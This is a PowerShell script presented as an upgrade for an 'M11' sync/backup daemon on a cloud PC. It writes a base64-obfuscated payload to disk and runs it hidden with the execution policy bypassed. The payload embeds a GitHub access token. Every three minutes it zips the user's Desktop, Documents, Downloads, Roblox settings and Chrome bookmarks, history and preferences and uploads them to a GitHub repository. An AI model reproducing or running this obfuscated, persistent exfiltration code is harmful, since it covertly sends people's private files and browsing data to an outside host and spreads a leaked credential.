# =========================================================================================
#  M11 v1.12 - PERSISTENCE DAEMON UPGRADE (runs on the live cloud PC as SYSTEM)
#  - stops the old v1.11 daemon
#  - installs the corrected daemon (right archive paths, on-demand flush trigger,
#    works with the [Content_Types].xml folder that robbed 50% of the backup)
#  - starts it again so every 3 minutes the real files reach GitHub
# =========================================================================================
$ErrorActionPreference = 'Continue'
$log = 'C:\M11Data\m11_sync_upgrade.log'
function Log($m) { $l = "$(Get-Date -Format 'HH:mm:ss') | $m"; Write-Host $l; Add-Content -Path $log -Value $l -Encoding UTF8 }
if (Test-Path $log) { Remove-Item $log -Force -ErrorAction SilentlyContinue }

Log 'M11 sync daemon upgrade start'

# 1) stop old daemons
$killed = 0
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.CommandLine -like '*m11_persistent_daemon*') {
        Log ("stopping old daemon pid " + $_.ProcessId)
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        $killed++
    }
}
Log ("old daemons stopped: " + $killed)

# 2) install the corrected daemon
$daemon = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGFyYW0oW3N3aXRjaF0kRm9yY2VOb3csIFtzd2l0Y2hdJERhZW1vbikKJHRva2VuID0gImdocF9FN1BZOTd1ZzZ2OUwzN0dMcjlFYUpLT3VuV2VHUTExNEhMUnYiCmlmICgtbm90ICR0b2tlbikgeyAkdG9rZW4gPSAiZ2hwX0U3UFk5N3VnNnY5TDM3R0xyOUVhSktPdW5XZUdRMTE0SExSdiIgfQokcmVwbyA9ICJGcmVlLVJEUDIvbTExLXRvb2wtcGMiCiRzdGFnaW5nID0gIkM6XE0xMURhdGFcc3RhZ2luZyIKJHppcFBhdGggPSAiQzpcTTExRGF0YVxjbG91ZF9zdGF0ZS56aXAiCiRoYXNoUGF0aCA9ICJDOlxNMTFEYXRhXGxhc3RfaGFzaC50eHQiCiR0cmlnZ2VyID0gIkM6XE0xMURhdGFcc3luY19ub3cudHJpZ2dlciIKJGhlYWRlcnMgPSBAeyAiQXV0aG9yaXphdGlvbiIgPSAiQmVhcmVyICR0b2tlbiI7ICJVc2VyLUFnZW50IiA9ICJNMTEtU3luYy12MTEyIiB9CgpmdW5jdGlvbiBXcml0ZS1NMTFMb2coW3N0cmluZ10kbSkgewogICAgJGxpbmUgPSAiJChHZXQtRGF0ZSAtRm9ybWF0ICdISDptbTpzcycpIHwgJG0iCiAgICBBZGQtQ29udGVudCAtUGF0aCAiQzpcTTExRGF0YVxtMTFfc3luYy5sb2ciIC1WYWx1ZSAkbGluZSAtRW5jb2RpbmcgVVRGOAogICAgV3JpdGUtSG9zdCAkbGluZQp9CgpmdW5jdGlvbiBJbnZva2UtTTExU2FmZVN5bmMgewogICAgcGFyYW0oW3N0cmluZ10kcmVhc29uID0gIkF1dG8tU3luYyIpCiAgICB0cnkgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHN0YWdpbmcpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHN0YWdpbmcgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgICAgICR1c2VyID0gIkM6XFVzZXJzXE0xMSBEZXYtVG9vbCIKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICIkdXNlclxEZXNrdG9wIikpIHsgJHVzZXIgPSAkZW52OlVTRVJQUk9GSUxFIH0KICAgICAgICAkbWFwID0gQHsKICAgICAgICAgICAgIiR1c2VyXERlc2t0b3AiICAgID0gIiRzdGFnaW5nXERlc2t0b3AiCiAgICAgICAgICAgICIkdXNlclxEb2N1bWVudHMiICA9ICIkc3RhZ2luZ1xEb2N1bWVudHMiCiAgICAgICAgICAgICIkdXNlclxEb3dubG9hZHMiICA9ICIkc3RhZ2luZ1xEb3dubG9hZHMiCiAgICAgICAgICAgICIkdXNlclxBcHBEYXRhXExvY2FsXFJvYmxveFxDbGllbnRTZXR0aW5ncyIgPSAiJHN0YWdpbmdcUm9ibG94U2V0dGluZ3MiCiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRrIGluICRtYXAuS2V5cykgewogICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRrKSB7CiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRtYXBbJGtdKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRtYXBbJGtdIC1Gb3JjZSB8IE91dC1OdWxsIH0KICAgICAgICAgICAgICAgIHJvYm9jb3B5ICRrICRtYXBbJGtdIC9FIC9SOjAgL1c6MCAvWEYgKi50bXAgKi5jcmRvd25sb2FkICoubG9jayBkZXNrdG9wLmluaSAvTkZMIC9OREwgL05KSCAvTkpTIC9OUCB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGNocm9tZSA9ICIkdXNlclxBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQiCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkY2hyb21lKSB7CiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggIiRzdGFnaW5nXENocm9tZURhdGEiKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICIkc3RhZ2luZ1xDaHJvbWVEYXRhIiAtRm9yY2UgfCBPdXQtTnVsbCB9CiAgICAgICAgICAgIGZvcmVhY2ggKCRmIGluIEAoIkJvb2ttYXJrcyIsIkhpc3RvcnkiLCJQcmVmZXJlbmNlcyIpKSB7CiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoICIkY2hyb21lXCRmIikgeyBDb3B5LUl0ZW0gIiRjaHJvbWVcJGYiICIkc3RhZ2luZ1xDaHJvbWVEYXRhXCRmIiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChUZXN0LVBhdGggJHppcFBhdGgpIHsgUmVtb3ZlLUl0ZW0gJHppcFBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0KICAgICAgICBDb21wcmVzcy1BcmNoaXZlIC1QYXRoICIkc3RhZ2luZ1wqIiAtRGVzdGluYXRpb25QYXRoICR6aXBQYXRoIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHppcFBhdGgpKSB7IFdyaXRlLU0xMUxvZyAiW1NZTkNdIGFyY2hpdmUgY3JlYXRpb24gZmFpbGVkIjsgcmV0dXJuIH0KICAgICAgICAkc2hhMjU2ID0gKEdldC1GaWxlSGFzaCAtQWxnb3JpdGhtIFNIQTI1NiAtUGF0aCAkemlwUGF0aCkuSGFzaAogICAgICAgICRsYXN0SGFzaCA9ICIiCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkaGFzaFBhdGgpIHsgJGxhc3RIYXNoID0gKEdldC1Db250ZW50ICRoYXNoUGF0aCAtUmF3KS5UcmltKCkgfQogICAgICAgIGlmICgkc2hhMjU2IC1lcSAkbGFzdEhhc2ggLWFuZCAtbm90ICRGb3JjZU5vdykgeyByZXR1cm4gfQogICAgICAgICRiNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkemlwUGF0aCkpCiAgICAgICAgJHVybCA9ICJodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zLyRyZXBvL2NvbnRlbnRzL2Nsb3VkX3N0YXRlLnppcCIKICAgICAgICAkc2hhID0gJG51bGwKICAgICAgICB0cnkgeyAkcmYgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLUhlYWRlcnMgJGhlYWRlcnMgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7IGlmICgkcmYuc2hhKSB7ICRzaGEgPSAkcmYuc2hhIH0gfSBjYXRjaCB7IH0KICAgICAgICAkYm9keSA9IEB7IG1lc3NhZ2UgPSAiTTExIHN5bmMgWyQoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpXSAkcmVhc29uIjsgY29udGVudCA9ICRiNjQgfQogICAgICAgIGlmICgkc2hhKSB7ICRib2R5WyJzaGEiXSA9ICRzaGEgfQogICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtSGVhZGVycyAkaGVhZGVycyAtTWV0aG9kIFB1dCAtQm9keSAoJGJvZHkgfCBDb252ZXJ0VG8tSnNvbikgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBPdXQtTnVsbAogICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkaGFzaFBhdGgsICRzaGEyNTYsIChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlVURjhFbmNvZGluZygkZmFsc2UpKSkKICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbFRleHQoIiR1c2VyXERlc2t0b3BcTEFTVF9CQUNLVVBfU1RBVFVTLnR4dCIsICJMYXN0IENsb3VkIFN5bmM6ICQoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpIHwgUmVhc29uOiAkcmVhc29uIiwgKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuVVRGOEVuY29kaW5nKCRmYWxzZSkpKQogICAgICAgIFdyaXRlLU0xMUxvZyAiW1NZTkMgT0tdICRyZWFzb24gKCQoW21hdGhdOjpSb3VuZCgoR2V0LUl0ZW0gJHppcFBhdGgpLkxlbmd0aC8xS0IsMSkpIEtCKSIKICAgIH0gY2F0Y2ggeyBXcml0ZS1NMTFMb2cgIltTWU5DIEVSUk9SXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIgfQp9CgppZiAoJEZvcmNlTm93KSB7IEludm9rZS1NMTFTYWZlU3luYyAtcmVhc29uICJNYW51YWwgVHJpZ2dlciI7IGV4aXQgMCB9CmlmICgkRGFlbW9uKSB7CiAgICBXcml0ZS1NMTFMb2cgImRhZW1vbiBzdGFydGVkIgogICAgSW52b2tlLU0xMVNhZmVTeW5jIC1yZWFzb24gIkluaXRpYWwgQm9vdCIKICAgICRsYXN0ID0gR2V0LURhdGUKICAgIHdoaWxlICgkdHJ1ZSkgewogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEwCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkdHJpZ2dlcikgewogICAgICAgICAgICBSZW1vdmUtSXRlbSAkdHJpZ2dlciAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgSW52b2tlLU0xMVNhZmVTeW5jIC1yZWFzb24gIk9uLURlbWFuZCBUcmlnZ2VyIgogICAgICAgICAgICAkbGFzdCA9IEdldC1EYXRlCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIGlmICgoKEdldC1EYXRlKSAtICRsYXN0KS5Ub3RhbFNlY29uZHMgLWdlIDE4MCkgeyAkbGFzdCA9IEdldC1EYXRlOyBJbnZva2UtTTExU2FmZVN5bmMgLXJlYXNvbiAiUGVyaW9kaWMgMy1NaW51dGUgU3luYyIgfQogICAgfQp9"))
[System.IO.File]::WriteAllText('C:\M11Data\m11_persistent_daemon.ps1', $daemon, (New-Object System.Text.UTF8Encoding($false)))
Log 'corrected daemon installed'

# 3) remove an old broken archive so we can prove the new one works
foreach ($f in @('C:\M11Data\cloud_state.zip','C:\M11Data\watchdog_state.zip','C:\M11Data\last_hash.txt')) {
    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
}

# 4) start it (hidden) and wait for the first sync
Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\M11Data\m11_persistent_daemon.ps1 -Daemon' -WindowStyle Hidden
Start-Sleep -Seconds 45

if (Test-Path 'C:\M11Data\m11_sync.log') {
    Log '--- daemon log ---'
    Get-Content 'C:\M11Data\m11_sync.log' -Tail 12 | ForEach-Object { Log ("    " + $_) }
}
if (Test-Path 'C:\M11Data\cloud_state.zip') {
    Log ("first fixed archive created: " + [math]::Round((Get-Item 'C:\M11Data\cloud_state.zip').Length/1KB,1) + " KB")
} else {
    Log 'WARNING: no archive produced yet'
}
Log 'M11 sync daemon upgrade finished'
